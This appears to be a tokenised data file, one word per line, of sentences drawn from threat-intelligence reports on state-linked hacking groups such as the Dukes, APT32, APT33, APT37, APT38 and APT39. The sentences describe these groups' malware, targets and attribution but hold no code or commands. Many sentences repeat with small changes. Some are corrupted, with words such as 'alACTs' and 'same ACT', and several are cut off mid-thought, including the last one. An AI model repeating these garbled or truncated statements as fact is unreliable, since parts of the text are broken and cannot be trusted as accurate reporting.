 
The
Komplex
Trojan
revealed
a
design
similar
to
Sofacy
's
Carberp
variant
Trojan
,
which
we
believe
may
have
been
done
in
order
to
handle
compromised
Windows
and
OS
X
systems
using
the
same
C2
server
application
with
relative
ease
.
 
This
whitepaper
explores
the
tools
-
such
as
MiniDuke
,
CosmicDuke
,
OnionDuke
,
CozyDuke
,
etc-
of
the
Dukes
,
a
well-resourced
,
highly
dedicated
and
organized
cyberespionage
group
that
we
believe
has
been
working
for
the
Russian
Federation
since
at
least
2008
to
collect
intelligence
in
support
of
foreign
and
security
policy
decision-making
.
 
The
Dukes
are
a
well-resourced
,
highly
dedicated
and
organized
cyberespionage
group
that
we
believe
has
been
working
for
the
Russian
Federation
since
at
least
2008
to
collect
intelligence
in
support
of
foreign
and
security
policy
decision-making
.
 
The
Dukes
are
known
to
employ
a
vast
arsenal
of
malware
toolsets
,
which
we
identify
as
MiniDuke
,
CosmicDuke
,
OnionDuke
,
CozyDuke
,
CloudDuke
,
SeaDuke
,
HammerDuke
,
PinchDuke
,
and
GeminiDuke
.
 
The
origins
of
the
Duke
toolset
names
can
be
traced
back
to
when
researchers
at
Kaspersky
Labs
coined
the
term
"
MiniDuke
"
to
identify
the
first
Duke-related
malware
they
found
.
 
As
researchers
continued
discovering
new
toolsets
that
were
created
and
used
by
the
same
group
that
had
been
operating
MiniDuke
,
and
thus
the
threat
actor
operating
the
toolsets
started
to
be
commonly
referred
to
as
"
Dukes
"
.
 
Based
on
the
campaign
identifiers
found
in
PinchDuke
samples
discovered
from
2009
,
the
targets
of
the
Dukes
group
during
that
year
included
organizations
such
as
the
Ministry
of
Defense
of
Georgia
and
the
ministries
of
foreign
affairs
of
Turkey
and
Uganda
.
 
Importantly
,
PinchDuke
trojan
samples
alACTs
contain
a
notable
text
string
,
which
we
believe
is
used
as
a
campaign
identifier
by
the
Dukes
group
to
distinguish
between
multiple
attack
campaigns
that
are
run
in
parallel
.
 
This
neatly
ties
together
many
of
the
tools
used
by
the
Dukes
group
,
as
versions
of
this
one
loader
have
been
used
to
load
malware
from
three
different
Dukes-related
toolsets
CosmicDuke
,
PinchDuke
,
and
MiniDuke
over
the
course
of
five
years
.
 
The
Dukes
continued
the
expansion
of
their
arsenal
in
2011
with
the
addition
of
two
more
toolsets
:
MiniDuke
and
CozyDuke
.
 
As
we
now
know
,
by
February
2013
the
Dukes
group
had
been
operating
MiniDuke
and
other
toolsets
for
at
least
4
and
a
half
years
.
 
Secondly
,
the
value
the
Dukes
intended
to
gain
from
these
MiniDuke
campaigns
may
have
been
so
great
that
they
deemed
it
worth
the
risk
of
getting
noticed
.
 
This
is
in
stark
contrast
to
some
other
suspected
Russian
threat
actors
(
such
as
Operation
Pawn
Storm
)
who
appear
to
have
increased
their
targeting
of
Ukraine
following
the
crisis
.
 
The
Dukes
actively
targeted
Ukraine
before
the
crisis
,
at
a
time
when
Russia
was
still
weighing
her
options
,
but
once
Russia
moved
from
diplomacy
to
direct
action
,
Ukraine
was
no
longer
relevant
to
the
Dukes
in
the
same
ACT
.
 
In
the
latter
case
however
,
the
Dukes
group
appear
to
have
also
simultaneously
developed
an
entirely
new
loader
,
which
we
first
observed
being
used
in
conjunction
with
CosmicDuke
during
the
spring
of
2015
.
 
The
Dukes
could
have
ceased
all
use
of
CosmicDuke
(
at
least
until
they
had
developed
a
new
loader
)
or
retired
it
entirely
,
since
they
still
had
other
toolsets
available
.
 
For
these
CozyDuke
campaigns
however
,
the
Dukes
appear
to
have
employed
two
particular
later-stage
toolsets
,
SeaDuke
and
HammerDuke
.
 
Firstly
,
as
with
the
MiniDuke
campaigns
of
February
2013
and
CosmicDuke
campaigns
in
the
summer
of
2014
,
again
the
group
clearly
prioritized
the
continuation
of
their
operations
over
maintaining
stealth
.
 
In
addition
to
the
notably
overt
and
large-scale
campaigns
with
CozyDuke
and
CloudDuke
,
the
Dukes
also
continued
to
engage
in
more
covert
,
surgical
campaigns
using
CosmicDuke
.
 
We
are
however
only
aware
of
one
instance
-
the
exploitation
of
CVE-2013-0640
to
deploy
MiniDuke
-
where
we
believe
the
exploited
vulnerability
was
a
zero-day
at
the
time
that
the
group
acquired
the
exploit
.
 
All
of
the
available
evidence
however
does
in
our
opinion
suggest
that
the
group
operates
on
behalf
of
the
Russian
Federation
.
 
This
assertion
of
time
zone
is
also
supported
by
timestamps
found
in
many
GeminiDuke
samples
,
which
similarly
suggest
the
group
work
in
the
Moscow
Standard
TIME
timezone
,
as
further
detailed
in
the
section
on
the
technical
analysis
of
GeminiDuke
.
 
Mandiant
has
observed
Russian
nation-state
attackers
APT29
employing
domain
fronting
techniques
for
stealthy
backdoor
access
to
victim
environments
for
at
least
two
years
.
 
APT29
has
used
The
Onion
Router
and
the
TOR
domain
fronting
plugin
meek
to
create
a
hidden
,
encrypted
network
tunnel
that
appeared
to
connect
to
Google
services
over
TLS
.
 
Mandiant
has
observed
APT29
using
a
stealthy
backdoor
that
we
call
POSHSPY
.
 
Mandiant
has
since
identified
POSHSPY
in
several
other
environments
compromised
by
APT29
over
the
past
two
years
.
 
In
the
investigations
Mandiant
has
conducted
,
it
appeared
that
APT29
deployed
POSHSPY
as
a
secondary
backdoor
for
use
if
they
lost
access
to
their
primary
backdoors
.
 
POSHSPY
is
an
excellent
example
of
the
skill
and
craftiness
of
APT29
.
 
FireEye
assesses
that
APT32
leverages
a
unique
suite
of
fully-featured
malware
,
in
conjunction
with
commercially-available
tools
,
to
conduct
targeted
operations
that
are
aligned
with
Vietnamese
state
interests
.
 
In
addition
to
focused
targeting
of
the
private
sector
with
ties
to
Vietnam
,
APT32
has
also
targeted
foreign
governments
,
as
well
as
Vietnamese
dissidents
and
journalists
since
at
least
2013
.
 
From
2016
through
2017
,
two
subsidiaries
of
U.S.
and
Philippine
consumer
products
corporations
,
located
inside
Vietnam
,
were
the
target
of
APT32
intrusion
operations
.
 
From
2016
through
2017
,
two
consumer
products
corporations
,
located
inside
Vietnam
,
were
the
target
of
APT32
intrusion
operations
.
 
In
2014
,
APT32
leveraged
a
spear-phishing
attachment
titled
"
Plans
to
crackdown
on
protesters
at
the
Embassy
of
Vietnam.exe
,
"
which
targeted
dissident
activity
among
the
Vietnamese
diaspora
in
Southeast
Asia
.
 
In
2015
and
2016
,
two
Vietnamese
media
outlets
were
targeted
with
malware
that
FireEye
assesses
to
be
unique
to
APT32
.
 
In
2014
,
APT32
leveraged
a
spear-phishing
attachment
titled
"
Plans
to
crackdown
on
protesters
at
the
Embassy
of
Vietnam.exe
"
.
 
Since
at
least
2014
,
FireEye
has
observed
APT32
targeting
foreign
corporations
with
a
vested
interest
in
Vietnam
's
manufacturing
,
consumer
products
,
and
hospitality
sectors
.
 
APT32
operations
are
characterized
through
deployment
of
signature
malware
payloads
including
WINDSHIELD
,
KOMPROGO
,
SOUNDBITE
,
and
PHOREAL
.
 
In
2017
,
social
engineering
content
in
lures
used
by
the
actor
provided
evidence
that
they
were
likely
used
to
target
members
of
the
Vietnam
diaspora
in
Australia
as
well
as
government
employees
in
the
Philippines
.
 
APT32
often
deploys
these
backdoors
along
with
the
commercially-available
Cobalt
Strike
BEACON
backdoor
.
 
APT32
often
deploys
these
backdoors
along
with
the
commercially-available
Cobalt
Strike
backdoor
.
 
Based
on
incident
response
investigations
,
product
detections
,
and
intelligence
observations
along
with
additional
publications
on
the
same
operators
,
FireEye
assesses
that
APT32
is
a
cyber
espionage
group
aligned
with
Vietnamese
government
interests
.
 
OceanLotus
,
also
known
as
APT32
,
is
believed
to
be
a
Vietnam-based
APT
group
that
has
become
increasingly
sophisticated
in
its
attack
tactics
,
techniques
,
and
procedures
(
TTPs
)
.
 
While
Volexity
does
not
typically
engage
in
attempting
attribution
of
any
threat
actor
,
Volexity
does
agree
with
previously
reported
assessments
that
OceanLotus
is
likely
operating
out
of
Vietnam
.
 
During
that
phase
,
the
APT32
operated
a
fileless
PowerShell-based
infrastructure
,
using
customized
PowerShell
payloads
taken
from
known
offensive
frameworks
such
as
Cobalt
Strike
,
PowerSploit
and
Nishang
.
 
However
,
over
the
past
few
years
,
we
have
been
tracking
a
separate
,
less
widely
known
suspected
Iranian
group
with
potential
destructive
capabilities
,
whom
we
call
APT33
.
 
Our
analysis
reveals
that
APT33
is
a
capable
group
that
has
carried
out
cyber
espionage
operations
since
at
least
2013
.
 
We
assess
APT33
works
at
the
behest
of
the
Iranian
government
.
 
APT33
has
targeted
organizations
spanning
multiple
industries
headquartered
in
the
United
States
,
Saudi
Arabia
and
South
Korea
.
 
Cybereason
also
attributes
the
recently
reported
Backdoor.Win32.Denis
to
the
OceanLotus
Group
,
which
at
the
time
of
this
report
's
writing
,
had
not
been
officially
linked
to
this
threat
actor
.
 
APT33
has
shown
particular
interest
in
organizations
in
the
aviation
sector
,
as
well
as
organizations
in
the
energy
sector
with
ties
to
petrochemical
production
.
 
From
mid-2016
through
early
2017
,
APT33
compromised
a
U.S.
organization
in
the
aerospace
sector
and
targeted
a
business
conglomerate
located
in
Saudi
Arabia
with
aviation
holdings
.
 
From
mid-2016
through
early
2017
,
APT33
compromised
organizations
located
in
Saudi
Arabia
and
U.S.
in
the
aerospace
sector
.
 
During
the
same
time
period
,
APT33
also
targeted
companies
in
South
Korea
involved
in
oil
refining
and
petrochemicals
.
 
More
recently
,
in
May
2017
,
APT33
appeared
to
target
a
Saudi
organization
and
a
South
Korean
business
conglomerate
using
a
malicious
file
that
attempted
to
entice
victims
with
job
vacancies
for
a
Saudi
Arabian
petrochemical
company
.
 
More
recently
,
in
May
2017
,
APT33
appeared
to
target
organizations
in
Saudi
and
South
Korea
using
a
malicious
file
that
attempted
to
entice
victims
with
job
vacancies
.
 
We
assess
the
targeting
of
multiple
companies
with
aviation-related
partnerships
to
Saudi
Arabia
indicates
that
APT33
may
possibly
be
looking
to
gain
insights
on
Saudi
Arabia
's
military
aviation
capabilities
to
enhance
Iran
's
domestic
aviation
capabilities
or
to
support
Iran
's
military
and
strategic
decision
making
vis
a
vis
Saudi
Arabia
.
 
APT33
may
possibly
be
looking
to
gain
insights
on
Saudi
Arabia
's
military
aviation
capabilities
to
enhance
Iran
's
domestic
aviation
capabilities
or
to
support
Iran
's
military
and
strategic
decision
making
vis
a
vis
Saudi
Arabia
.
 
The
generalized
targeting
of
organizations
involved
in
energy
and
petrochemicals
mirrors
previously
observed
targeting
by
other
suspected
Iranian
threat
groups
,
indicating
a
common
interest
in
the
sectors
across
Iranian
actors
.
 
APT33
sent
spear
phishing
emails
to
employees
whose
jobs
related
to
the
aviation
industry
.
 
APT33
registered
multiple
domains
that
masquerade
as
Saudi
Arabian
aviation
companies
and
Western
organizations
that
together
have
partnerships
to
provide
training
,
maintenance
and
support
for
Saudi
's
military
and
commercial
fleet
.
 
We
identified
APT33
malware
tied
to
an
Iranian
persona
who
may
have
been
employed
by
the
Iranian
government
to
conduct
cyber
threat
activity
against
its
adversaries
.
 
APT33
's
targeting
of
organizations
involved
in
aerospace
and
energy
most
closely
aligns
with
nation-state
interests
,
implying
that
the
threat
actor
is
most
likely
government
sponsored
.
 
APT33
leverages
popular
Iranian
hacker
tools
and
DNS
servers
used
by
other
suspected
Iranian
threat
groups
.
 
This
coupled
with
the
timing
of
operations
which
coincides
with
Iranian
working
hours
and
the
use
of
multiple
Iranian
hacker
tools
and
name
servers
bolsters
our
assessment
that
APT33
may
have
operated
on
behalf
of
the
Iranian
government
.
 
The
publicly
available
backdoors
and
tools
utilized
by
APT33
including
NANOCORE
,
NETWIRE
,
and
ALFA
Shell
are
all
available
on
Iranian
hacking
websites
,
associated
with
Iranian
hackers
,
and
used
by
other
suspected
Iranian
threat
groups
.
 
APT33
's
focus
on
aviation
may
indicate
the
group
's
desire
to
gain
insight
into
regional
military
capabilities
to
enhance
Iran
's
aviation
capabilities
or
to
support
Iran
's
military
and
strategic
decision
making
.
 
Specifically
,
the
targeting
of
organizations
in
the
aerospace
and
energy
sectors
indicates
that
the
APT33
is
likely
in
search
of
strategic
intelligence
capable
of
benefitting
a
government
or
military
sponsor
.
 
APT33
's
focus
on
aviation
may
indicate
the
group
's
desire
to
gain
insight
into
regional
military
aviation
capabilities
to
enhance
Iran
's
aviation
capabilities
or
to
support
Iran
's
military
and
strategic
decision
making
.
 
We
expect
APT33
activity
will
continue
to
cover
a
broad
scope
of
targeted
entities
,
and
may
spread
into
other
regions
and
sectors
as
Iranian
interests
dictate
.
 
The
Elfin
espionage
group
(
aka
APT33
)
has
remained
highly
active
over
the
past
three
years
,
attacking
at
least
50
organizations
in
Saudi
Arabia
,
the
United
States
,
and
a
range
of
other
countries
.
 
On
May
16
,
2019
FireEye
's
Advanced
Practices
team
attributed
the
remaining
"
suspected
APT33
activity
"
(
referred
to
as
GroupB
in
this
blog
post
)
to
APT33
,
operating
at
the
behest
of
the
Iranian
government
.
 
The
Elfin
group
(
aka
APT33
)
has
remained
highly
active
over
the
past
three
years
,
attacking
at
least
50
organizations
in
Saudi
Arabia
,
the
United
States
,
and
a
range
of
other
countries
.
 
On
May
16
,
2019
FireEye
's
Advanced
Practices
team
attributed
the
remaining
"
suspected
APT33
activity
"
to
APT33
,
operating
at
the
behest
of
the
Iranian
government
.
 
APT37
has
likely
been
active
since
at
least
2012
and
focuses
on
targeting
the
public
and
private
sectors
primarily
in
South
Korea
.
 
In
2017
,
APT37
expanded
its
targeting
beyond
the
Korean
peninsula
to
include
Japan
,
Vietnam
and
the
Middle
East
,
and
to
a
wider
range
of
industry
verticals
,
including
chemicals
,
electronics
,
manufacturing
,
aerospace
,
automotive
and
healthcare
entities
.
 
In
2017
,
APT37
targeted
a
company
in
Middle
East
that
entered
into
a
joint
venture
with
the
North
Korean
government
to
provide
telecommunications
service
to
the
country
.
 
While
not
conclusive
by
itself
,
the
use
of
publicly
available
Iranian
hacking
tools
and
popular
Iranian
hosting
companies
may
be
a
result
of
APT33
's
familiarity
with
them
and
lends
support
to
the
assessment
that
APT33
may
be
based
in
Iran
.
 
North
Korean
defector
and
human
rights-related
targeting
provides
further
evidence
that
APT37
conducts
operations
aligned
with
the
interests
of
North
Korea
.
 
In
2017
,
APT37
targeted
a
Middle
Eastern
company
that
entered
into
a
joint
venture
with
the
North
Korean
government
to
provide
telecommunications
service
to
the
country
(
read
on
for
a
case
study
)
.
 
APT37
targeted
a
research
fellow
,
advisory
member
,
and
journalist
associated
with
different
North
Korean
human
rights
issues
and
strategic
organizations
.
 
APT37
distributed
SLOWDRIFT
malware
using
a
lure
referencing
the
Korea
Global
Forum
against
academic
and
strategic
institutions
located
in
South
Korea
.
 
We
believe
a
organization
located
in
Middle
East
was
targeted
by
APT37
because
it
had
been
involved
with
a
North
Korean
company
and
a
business
deal
went
bad
.
 
In
one
instance
,
APT37
weaponized
a
video
downloader
application
with
KARAE
malware
that
was
indiscriminately
distributed
to
South
Korean
victims
through
torrent
websites
.
 
FireEye
confirmed
that
since
at
least
November
2017
,
APT37
exploited
a
zero-day
Adobe
Flash
vulnerability
,
CVE-2018-4878
,
to
distribute
DOGCALL
malware
to
South
Korean
victims
.
 
FireEye
iSIGHT
Intelligence
confirmed
that
since
at
least
November
2017
,
APT37
exploited
a
zero-day
Adobe
Flash
vulnerability
,
CVE-2018-4878
,
to
distribute
DOGCALL
malware
to
South
Korean
victims
.
 
In
April
2017
,
APT37
targeted
South
Korean
military
and
government
organizations
with
the
DOGCALL
backdoor
and
RUHAPPY
wiper
malware
.
 
It
is
possible
that
APT37
's
distribution
of
KARAE
malware
via
torrent
websites
could
assist
in
creating
and
maintaining
botnets
for
future
distributed
denial-of-service
(
DDoS
)
attacks
,
or
for
other
activity
such
as
financially
motivated
campaigns
or
disruptive
operations
.
 
We
assess
with
high
confidence
that
APT37
acts
in
support
of
the
North
Korean
government
and
is
primarily
based
in
North
Korea
.
 
The
compilation
times
of
APT37
malware
is
consistent
with
a
developer
operating
in
the
North
Korea
time
zone
(
UTC
+8:30
)
and
follows
what
is
believed
to
be
a
typical
North
Korean
workday
.
 
The
majority
of
APT37
activity
continues
to
target
South
Korea
,
North
Korean
defectors
,
and
organizations
and
individuals
involved
in
Korean
Peninsula
reunification
efforts
.
 
Similarly
,
APT37
targeting
of
a
company
located
in
Middle
East
in
2017
is
also
consistent
with
North
Korean
objectives
given
the
entity
's
extensive
relationships
inside
North
Korea
.
 
Similarly
,
APT37
targeting
of
a
Middle
Eastern
company
in
2017
is
also
consistent
with
North
Korean
objectives
given
the
entity
's
extensive
relationships
inside
North
Korea
.
 
In
May
2017
,
APT37
used
a
bank
liquidation
letter
as
a
spear
phishing
lure
against
a
board
member
of
a
Middle
Eastern
financial
company
.
 
Though
they
have
primarily
tapped
other
tracked
suspected
North
Korean
teams
to
carry
out
the
most
aggressive
actions
,
APT37
is
an
additional
tool
available
to
the
regime
,
perhaps
even
desirable
for
its
relative
obscurity
.
 
ScarCruft
is
a
relatively
new
APT
group
,
victims
have
been
observed
in
Russia
,
Nepal
,
South
Korea
,
China
,
India
,
Kuwait
and
Romania
.
 
Certain
details
,
such
as
using
the
same
infrastructure
and
targeting
,
make
us
believe
that
Operation
Daybreak
is
being
done
by
the
ScarCruft
APT
group
.
 
Prior
to
the
discovery
of
Operation
Daybreak
,
we
observed
the
ScarCruft
APT
launching
a
series
of
attacks
in
Operation
Erebus
.
 
Operation
Daybreak
appears
to
have
been
launched
by
unknown
attackers
to
infect
high
profile
targets
through
spear-phishing
e-mails
.
 
Operation
Daybreak
appears
to
have
been
launched
by
APT37
to
infect
high
profile
targets
through
spear-phishing
e-mails
.
 
On
occasion
the
APT37
directly
included
the
ROKRAT
payload
in
the
malicious
document
and
during
other
campaigns
the
attackers
leveraged
multi-stage
infection
processes
.
 
In
the
early
part
of
2017
,
Group123
started
the
"
Evil
New
Year
"
campaign
.
 
In
November
2017
,
Talos
observed
the
latest
Group123
campaign
of
the
year
,
which
included
a
new
version
of
ROKRAT
being
used
in
the
latest
wave
of
attacks
.
 
Group123
is
constantly
evolving
as
the
new
fileless
capability
that
was
added
to
ROKRAT
demonstrates
.
 
In
this
campaign
,
the
Group123
used
a
classical
HWP
document
in
order
to
download
and
execute
a
previously
unknown
malware
:
NavRAT
.
 
However
,
we
asses
with
medium
confidence
that
NavRAT
is
linked
to
Group123
.
 
APT38
is
a
financially
motivated
North
Korean
regime-backed
group
responsible
for
conducting
destructive
attacks
against
financial
institutions
,
as
well
as
some
of
the
world
's
largest
cyber
heists
.
 
APT38
is
a
financially
motivated
North
Korean
regime-backed
group
responsible
for
conducting
destructive
attacks
against
financial
institutions
,
as
well
as
some
of
the
world
.
 
APT38
is
believed
to
operate
more
similarly
to
an
espionage
operation
,
carefully
conducting
reconnaissance
within
compromised
financial
institutions
and
balancing
financially
motivated
objectives
with
learning
about
internal
systems
.
 
The
group
has
compromised
more
than
16
organizations
in
at
least
13
different
countries
,
sometimes
simultaneously
,
since
at
least
2014
.
 
APT38
shares
malware
code
and
other
development
resources
with
TEMP.Hermit
North
Korean
cyber
espionage
activity
,
although
we
consider
APT38
.
 
We
consider
APT38
's
operations
more
global
and
highly
specialized
for
targeting
the
financial
sector
.
 
APT38
is
a
financially
motivated
group
linked
to
North
Korean
cyber
espionage
operators
,
renown
for
attempting
to
steal
hundreds
of
millions
of
dollars
from
financial
institutions
and
their
brazen
use
of
destructive
malware
.
 
Because
APT38
is
backed
by
(
and
acts
on
behalf
of
)
the
North
Korean
regime
,
we
opted
to
categorize
the
group
as
an
"
APT
"
instead
of
a
"
FIN
"
.
 
Over
time
these
malware
similarities
diverged
,
as
did
targeting
,
intended
outcomes
,
and
TTPs
,
almost
certainly
indicating
that
TEMP.Hermit
activity
is
made
up
of
multiple
operational
groups
primarily
linked
together
with
shared
malware
development
resources
and
North
Korean
state
sponsorship
.
 
Based
on
observed
activity
,
we
judge
that
APT38
's
primary
mission
is
targeting
financial
institutions
and
manipulating
inter-bank
financial
systems
to
raise
large
sums
of
money
for
the
North
Korean
regime
.
 
Since
2015
,
APT38
has
attempted
to
steal
hundreds
of
millions
of
dollars
from
financial
institutions
.
 
APT38
has
pursued
their
main
objective
of
targeting
banks
and
financial
entities
since
at
least
2014
.
 
We
surmise
that
the
targeting
of
banks
,
media
,
and
government
agencies
is
conducted
in
support
of
APT38
's
primary
mission
.
 
The
APT38
targeted
news
outlets
known
for
their
business
and
financial
sector
reporting
,
probably
in
support
of
efforts
to
identify
and
compromise
additional
financial
institutions
.
 
APT38
also
targeted
financial
transaction
exchange
companies
likely
because
of
their
proximity
to
banks
.
 
Given
the
lapse
in
time
between
the
spear-phishing
and
the
heist
activity
in
the
above
example
,
we
suggest
two
separate
but
related
groups
under
the
North
Korean
regime
were
responsible
for
carrying
out
missions
;
one
associated
with
reconnaissance
(
TEMP.Hermit
or
a
related
group
)
and
another
for
the
heists
(
APT38
)
.
 
APT38
,
in
particular
,
is
strongly
distinguishable
because
of
its
specific
focus
on
financial
institutions
and
operations
that
attempt
to
use
SWIFT
fraud
to
steal
millions
of
dollars
at
a
time
.
 
We
can
confirm
that
the
APT38
operator
activity
is
linked
to
the
North
Korean
regime
,
but
maintains
a
set
of
common
characteristics
,
including
motivation
,
malware
,
targeting
,
and
TTPs
that
set
it
apart
from
other
statesponsored
operations
.
 
As
previously
mentioned
,
we
assess
with
high
confidence
that
APT38
's
mission
is
focused
on
targeting
financial
institutions
to
raise
money
for
the
North
Korean
regime
.
 
As
previously
mentioned
,
we
assess
with
high
confidence
that
APT38
's
mission
is
focused
on
targeting
financial
institutions
and
financial
systems
to
raise
money
for
the
North
Korean
regime
.
 
Although
the
APT38
's
primary
targets
appear
to
be
Financial
Exchange
banks
and
other
financial
organizations
,
they
have
also
Financial
Exchange
targeted
countries
'
media
organizations
with
a
focus
on
the
financial
sector
.
 
Since
at
least
the
beginning
of
2014
,
APT38
operations
have
focused
almost
exclusively
on
developing
and
conducting
financially
motivated
campaigns
targeting
international
entities
,
whereas
TEMP.Hermit
is
generally
linked
to
operations
focused
on
South
Korea
and
the
United
States
.
 
TEMP.Hermit
is
generally
linked
to
operations
focused
on
South
Korea
and
the
United
States
.
 
While
North
Korean
cyber
operations
against
specific
countries
may
have
been
driven
by
diplomatic
factors
and
perceived
insults
against
Pyongyang
,
the
application
of
increasingly
restrictive
and
numerous
financial
sanctions
against
North
Korea
probably
contributed
to
the
formation
of
APT38
.
 
APT38
's
operations
began
in
February
2014
and
were
likely
influenced
by
financial
sanctions
enacted
in
March
2013
that
blocked
bulk
cash
transfers
and
restricted
North
Korea
's
access
to
international
banking
systems
.
 
APT37
(
Reaper
)
,
another
North
Korean
state-sponsored
group
,
targeted
a
Middle
Eastern
financial
company
,
but
there
was
no
evidence
of
financial
fraud
.
 
APT37
,
another
North
Korean
state-sponsored
group
,
targeted
a
Middle
Eastern
financial
company
,
but
there
was
no
evidence
of
financial
fraud
.
 
Early
APT38
operations
suggest
that
the
group
began
targeting
financial
institutions
with
an
intent
to
manipulate
financial
transaction
systems
at
least
as
early
as
February
2014
,
although
we
did
not
observe
fraudulent
transactions
until
2015
.
 
We
do
not
have
evidence
that
the
earliest
targeted
financial
institutions
were
victimized
by
fraudulent
transactions
before
APT38
left
the
compromised
environments
,
possibly
indicating
that
APT38
was
conducting
reconnaissance-only
activity
at
that
time
.
 
In
early
2014
,
the
APT38
deployed
NESTEGG
(
a
backdoor
)
and
KEYLIME
(
a
keylogger
)
malware
designed
to
impact
financial
institution-specific
systems
at
a
Southeast
Asian
bank
.
 
In
early
2014
,
the
APT38
deployed
NESTEGG
(
a
backdoor
)
and
KEYLIME
(
a
keylogger
)
malware
designed
to
impact
financial
institution-specific
systems
at
a
Southeast
Asian
bank
.
 
From
November
2015
through
the
end
of
2016
,
APT38
was
involved
in
at
least
nine
separate
compromises
against
banks
.
 
Per
the
complaint
,
the
email
account
watsonhenny@gmail.com
was
used
to
send
LinkedIn
invitations
to
employees
of
a
bank
later
targeted
by
APT38
.
 
Further
,
the
recent
DOJ
complaint
provides
insight
into
initial
compromise
techniques
conducted
by
North
Korean
operators
against
APT38
targets
,
which
may
have
been
leveraged
as
part
of
the
initial
compromise
into
the
targeted
organizations
.
 
This
is
corroborated
by
our
identification
of
TEMP.Hermit
's
use
of
MACKTRUCK
at
a
bank
,
preceding
the
APT38
operation
targeting
the
bank
's
SWIFT
systems
in
late
2015
.
 
APT38
relies
on
DYEPACK
,
a
SWIFT
transaction-hijacking
framework
,
to
initiate
transactions
,
steal
money
,
and
hide
any
evidence
of
the
fraudulent
transactions
from
the
victimized
bank
.
 
The
APT38
uses
DYEPACK
to
manipulate
the
SWIFT
transaction
records
and
hide
evidence
of
the
malicious
transactions
,
so
bank
personnel
are
none
the
wiser
when
they
review
recent
transactions
.
 
During
this
heist
,
APT38
waited
for
a
holiday
weekend
in
the
respective
countries
to
increase
the
likelihood
of
hiding
the
transactions
from
banking
authorities
.
 
During
one
reported
incident
,
APT38
caused
an
outage
in
the
bank
's
essential
services
.
 
We
attribute
APT38
to
North
Korean
state-sponsored
operators
based
on
a
combination
of
technical
indicators
linking
the
activity
to
Pyongyang
and
details
released
by
DOJ
implicating
North
Korean
national
Park
Jin
Hyok
in
a
criminal
conspiracy
.
 
As
detailed
in
the
DOJ
complaint
,
a
sample
of
WHITEOUT
malware
we
attribute
to
APT38
was
used
between
2015
and
2016
against
a
Southeast
Asian
bank
.
 
APT38
's
increasingly
aggressive
targeting
against
banks
and
other
financial
institutions
has
paralleled
North
Korea
's
worsening
financial
condition
.
 
APT38
's
increasingly
aggressive
targeting
against
banks
and
other
financial
institutions
has
paralleled
North
Korea
's
worsening
financial
condition
.
 
APT38
's
increasingly
aggressive
targeting
against
banks
and
other
financial
institutions
has
paralleled
North
Korea
's
worsening
financial
condition
.
 
Malware
overlaps
between
APT38
and
TEMP.Hermit
highlight
the
shared
development
resources
accessible
by
multiple
operational
groups
linked
to
North
Korean
state-sponsored
activity
.
 
APT39
has
prioritized
the
telecommunications
sector
,
with
additional
targeting
of
the
travel
industry
and
IT
firms
that
support
it
and
the
high-tech
industry
.
 
This
is
evidence
of
shared
motivation
and
intent
to
target
the
SWIFT
system
by
the
North
Korean
operators
performing
the
reconnaissance
and
APT38
which
later
targeted
that
organization
.
 
Although
APT38
is
distinct
from
other
TEMP.Hermit
activity
,
both
groups
operate
consistently
within
the
interests
of
the
North
Korean
state
.
 
Based
on
details
published
in
the
DOJ
complaint
against
North
Korean
programmer
Park
Jin
Hyok
,
we
know
that
APT38
and
other
cyber
operators
linked
to
TEMP.Hermit
are
associated
with
Lab
110
,
an
organization
subordinate
to
or
synonymous
with
the
6th
Technical
Bureau
in
North
Korea
.
 
As
detailed
in
the
DOJ
complaint
,
a
sample
of
WHITEOUT
(
aka
Contopee
)
malware
we
attribute
to
APT38
was
used
between
2015
and
2016
against
a
Southeast
Asian
bank
.
 
Based
on
details
published
in
the
DOJ
complaint
against
North
Korean
programmer
Park
Jin
Hyok
,
we
know
that
APT38
and
other
cyber
operators
linked
to
TEMP.Hermit
are
associated
with
Lab
110
,
an
organization
subordinate
to
or
synonymous
with
the
6th
Technical
Bureau
in
North
Korea
's
Reconnaissance
General
Bureau
(
RGB
)
.
 
APT38
.
 
As
detailed
in
the
DOJ
complaint
,
a
sample
of
WHITEOUT
(
aka
Contopee
)
malware
we
attribute
to
APT38
was
used
between
2015
and
2016
against
a
Southeast
Asian
bank
.
 
APT38
's
targeting
of
financial
institutions
is
most
likely
an
effort
by
the
North
Korean
government
to
supplement
their
heavily-sanctioned
economy
.
 
We
have
moderate
confidence
APT39
operations
are
conducted
in
support
of
Iranian
national
interests
based
on
regional
targeting
patterns
focused
in
the
Middle
East
.
 
APT39
's
focus
on
the
widespread
theft
of
personal
information
sets
it
apart
from
other
Iranian
groups
FireEye
tracks
,
which
have
been
linked
to
influence
operations
,
disruptive
attacks
,
and
other
threats
.
 
APT39
's
focus
on
the
telecommunications
and
travel
industries
suggests
intent
to
perform
monitoring
,
tracking
,
or
surveillance
operations
against
specific
individuals
,
collect
proprietary
or
customer
data
for
commercial
or
operational
purposes
that
serve
strategic
requirements
related
to
national
priorities
,
or
create
additional
accesses
and
vectors
to
facilitate
future
campaigns
.
 
Other
groups
attributed
to
Iranian
attackers
,
such
as
Rocket
Kitten
,
have
targeted
Iranian
individuals
in
the
past
,
including
anonymous
proxy
users
,
researchers
,
journalists
,
and
dissidents
.
 
Remexi
is
a
basic
back
door
Trojan
that
allows
Cadelle
to
open
a
remote
shell
on
the
computer
and
execute
commands
.
 
Remexi
is
a
basic
back
door
Trojan
that
allows
attackers
to
open
a
remote
shell
on
the
computer
and
execute
commands
.
 
One
group
,
which
we
call
Cadelle
,
uses
Backdoor.Cadelspy
,
while
the
other
,
which
we've
named
Chafer
,
uses
Backdoor.Remexi
and
Backdoor.Remexi.B
.
 
APT39
facilitates
lateral
movement
through
myriad
tools
such
as
Remote
Desktop
Protocol
(
RDP
)
,
Secure
Shell
(
SSH
)
,
PsExec
,
RemCom
,
and
xCmdSvc
.
 
The
APT39
were
using
an
improved
version
of
Remexi
in
what
the
victimology
suggests
might
be
a
domestic
cyber-espionage
operation
.
 
A
well-funded
,
highly
active
group
of
Middle
Eastern
hackers
was
caught
,
yet
again
,
using
a
lucrative
zero-day
exploit
in
the
wild
to
break
into
computers
and
infect
them
with
powerful
spyware
developed
by
an
infamous
cyberweapons
dealer
named
Gamma
Group
.
 
A
well-funded
,
highly
active
BlackOasis
group
of
Middle
Eastern
hackers
was
caught
,
yet
again
,
using
a
lucrative
zero-day
exploit
in
the
wild
to
break
into
computers
and
infect
them
with
powerful
spyware
developed
by
an
infamous
cyberweapons
dealer
named
Gamma
Group
.
 
The
Middle
Eastern
hacker
group
in
this
case
is
codenamed
"
BlackOasis
"
.
 
Kaspersky
found
the
